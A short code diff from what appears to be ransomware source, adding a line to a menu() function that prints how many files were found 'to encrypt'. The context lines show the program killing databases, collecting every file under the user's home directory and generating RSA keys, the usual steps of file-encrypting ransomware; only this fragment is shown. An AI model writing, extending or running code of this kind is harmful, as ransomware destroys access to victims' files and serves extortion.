@@ -146,6 +146,8 @@ def menu():
     kill_databases()
         
     files = get_files.find_files(os.path.expanduser('~'))  # Use Windows home directory
+    
+    print(f"Found {len(files)} files to encrypt")
 
     rsa_object = asymmetric.assymetric()
     rsa_object.generate_keys()
